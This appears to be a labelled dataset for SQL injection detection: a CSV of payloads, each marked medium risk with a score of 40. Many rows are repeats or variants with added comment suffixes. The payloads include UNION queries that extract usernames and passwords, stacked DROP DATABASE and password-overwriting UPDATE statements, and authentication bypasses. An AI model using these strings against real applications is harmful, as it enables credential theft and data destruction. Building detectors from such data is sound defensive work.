query,risk,score
'; SELECT @@version --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; UPDATE users SET password='pass',medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' HAVING 1=1 #,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT @@version --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; DROP DATABASE temp --,medium,40
' HAVING 1=1 #,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT @@version --,medium,40
'; SELECT @@version --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' HAVING 1=1 #,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT @@version --,medium,40
'; DROP DATABASE temp --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT @@version --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' or 1=1 in (select * from users) --,medium,40
'; SELECT @@version --,medium,40
'; DROP DATABASE temp --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; SELECT @@version --,medium,40
' HAVING 1=1 #,medium,40
' or 1=1 in (select * from users) --,medium,40
'; SELECT @@version --,medium,40
'; UPDATE users SET password='pass',medium,40
'; DROP DATABASE temp --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; DROP DATABASE temp --,medium,40
' HAVING 1=1 #,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; DROP DATABASE temp --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' or 1=1 in (select * from users) --,medium,40
' OR username LIKE '%admin%' --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; UPDATE users SET password='pass',medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' or 1=1 in (select * from users) --,medium,40
' or 1=1 in (select * from users) --,medium,40
'; SELECT @@version --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; SELECT @@version --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; UPDATE users SET password='pass',medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; UPDATE users SET password='pass',medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; DROP DATABASE temp --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' HAVING 1=1 #,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; DROP DATABASE temp --,medium,40
' OR username LIKE '%admin%' --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' HAVING 1=1 #,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; DROP DATABASE temp --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' or 1=1 in (select * from users) --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' HAVING 1=1 #,medium,40
'; DROP DATABASE temp --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1=1 in (select * from users) --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
'; SELECT @@version --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; UPDATE users SET password='pass',medium,40
' or 1=1 in (select * from users) --,medium,40
'; UPDATE users SET password='pass',medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT @@version --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1=1 in (select * from users) --,medium,40
'; DROP DATABASE temp --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1=1 in (select * from users) --,medium,40
' HAVING 1=1 #,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; UPDATE users SET password='pass',medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' OR username LIKE '%admin%' --,medium,40
' OR username LIKE '%admin%' --,medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1=1 in (select * from users) --,medium,40
' HAVING 1=1 #,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' or 1=1 in (select * from users) --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT @@version --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT @@version --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' OR username LIKE '%admin%' --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; UPDATE users SET password='pass',medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; SELECT @@version --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
"' UNION SELECT username, password FROM users --",medium,40
"' UNION SELECT username, password FROM users --",medium,40
'; DROP DATABASE temp --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; DROP DATABASE temp --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; DROP DATABASE temp --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; UPDATE users SET password='pass',medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1=1 in (select * from users) --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' OR username LIKE '%admin%' --,medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1=1 in (select * from users) --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' HAVING 1=1 #,medium,40
'; SELECT @@version --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; UPDATE users SET password='pass',medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; UPDATE users SET password='pass',medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
'; SELECT @@version --,medium,40
' HAVING 1=1 #,medium,40
' HAVING 1=1 #,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; SELECT @@version --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' HAVING 1=1 #,medium,40
' HAVING 1=1 #,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' HAVING 1=1 #,medium,40
' or 1=1 in (select * from users) --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
'; SELECT @@version --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; SELECT @@version --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; DROP DATABASE temp --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT @@version --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
'; SELECT @@version --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' OR username LIKE '%admin%' --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
'; SELECT @@version --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
"' UNION SELECT username, password FROM users --",medium,40
' HAVING 1=1 #,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' OR username LIKE '%admin%' --,medium,40
' HAVING 1=1 #,medium,40
"' UNION SELECT username, password FROM users --",medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; DROP DATABASE temp --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
'; DROP DATABASE temp --,medium,40
' HAVING 1=1 #,medium,40
1' OR 1=1; SELECT * FROM users --,medium,40
'; UPDATE users SET password='pass',medium,40
' or 1=1 in (select * from users) --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
1' OR '1' = '1' GROUP BY 1 --,medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
"' UNION SELECT username, password FROM users --",medium,40
"' UNION SELECT username, password FROM users --",medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
'; SELECT COUNT(*) FROM users --,medium,40
' or 1=1 in (select * from users) --,medium,40
' or 1=1 in (select * from users) --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
"' OR '1'='1' UNION SELECT 1,2 --",medium,40
' or 1=1 in (select * from users) --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' UNION SELECT * FROM information_schema.tables --,medium,40
' OR username LIKE '%admin%' --,medium,40
'; DROP DATABASE temp --,medium,40
"' UNION ALL SELECT 1,2 FROM users --",medium,40
' or 1 = 1 LIMIT 1 --,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 7",medium,40
'; SELECT @@version -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' or 1=1 in (select * from users) -- # f,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- # l,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # c",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1=1 in (select * from users) -- # d,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; DROP DATABASE temp -- # i,medium,40
1' OR 1=1; SELECT * FROM users -- # e,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # a",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 4,medium,40
"' UNION SELECT username, password FROM users -- # b",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # v,medium,40
1' OR 1=1; SELECT * FROM users -- # f,medium,40
' or 1 = 1 LIMIT 1 -- # b,medium,40
1' OR 1=1; SELECT * FROM users -- # 6,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; DROP DATABASE temp -- # e,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # h",medium,40
' OR username LIKE '%admin%' -- # y,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # 6",medium,40
1' OR 1=1; SELECT * FROM users -- # a,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # y,medium,40
'; UPDATE users SET password='pass' # 6,medium,40
' OR username LIKE '%admin%' -- # 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 7",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # t,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # u",medium,40
'; SELECT COUNT(*) FROM users -- # u,medium,40
'; UPDATE users SET password='pass' # m,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # d",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; SELECT @@version -- # d,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # r",medium,40
'; UPDATE users SET password='pass' # r,medium,40
' or 1 = 1 LIMIT 1 -- # 4,medium,40
' or 1=1 in (select * from users) -- # s,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # y",medium,40
' or 1=1 in (select * from users) -- # c,medium,40
'; UPDATE users SET password='pass' # a,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 4,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3,medium,40
' HAVING 1=1 # -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # 7,medium,40
'; DROP DATABASE temp -- # 9,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # s",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # j",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # g",medium,40
'; SELECT @@version -- # o,medium,40
'; SELECT COUNT(*) FROM users -- # l,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 0",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' HAVING 1=1 # # n,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # h",medium,40
'; SELECT @@version -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; DROP DATABASE temp -- # 7,medium,40
1' OR '1' = '1' GROUP BY 1 -- # j,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 7,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # j",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' OR username LIKE '%admin%' -- # d,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 5,medium,40
' OR username LIKE '%admin%' -- # w,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # y,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' HAVING 1=1 # # k,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; UPDATE users SET password='pass' # 0,medium,40
' HAVING 1=1 # # f,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' OR username LIKE '%admin%' -- # g,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # m,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # x",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # 0",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # h",medium,40
' HAVING 1=1 # -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # b",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # i,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- # 6,medium,40
'; DROP DATABASE temp -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # r,medium,40
'; SELECT @@version -- # u,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # s,medium,40
' or 1 = 1 LIMIT 1 -- # u,medium,40
'; SELECT COUNT(*) FROM users -- # 7,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # v,medium,40
'; SELECT @@version -- # 9,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # v",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' HAVING 1=1 # # x,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # d",medium,40
1' OR '1' = '1' GROUP BY 1 -- # h,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # c",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # b",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; UPDATE users SET password='pass' # w,medium,40
'; DROP DATABASE temp -- # k,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- # 4,medium,40
' HAVING 1=1 # # g,medium,40
'; SELECT @@version -- # 3,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # o",medium,40
' HAVING 1=1 # -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 4,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 5",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # a",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' # 9,medium,40
'; SELECT @@version -- # u,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3,medium,40
' OR username LIKE '%admin%' -- # u,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' OR username LIKE '%admin%' -- # 6,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' HAVING 1=1 # # j,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # c",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
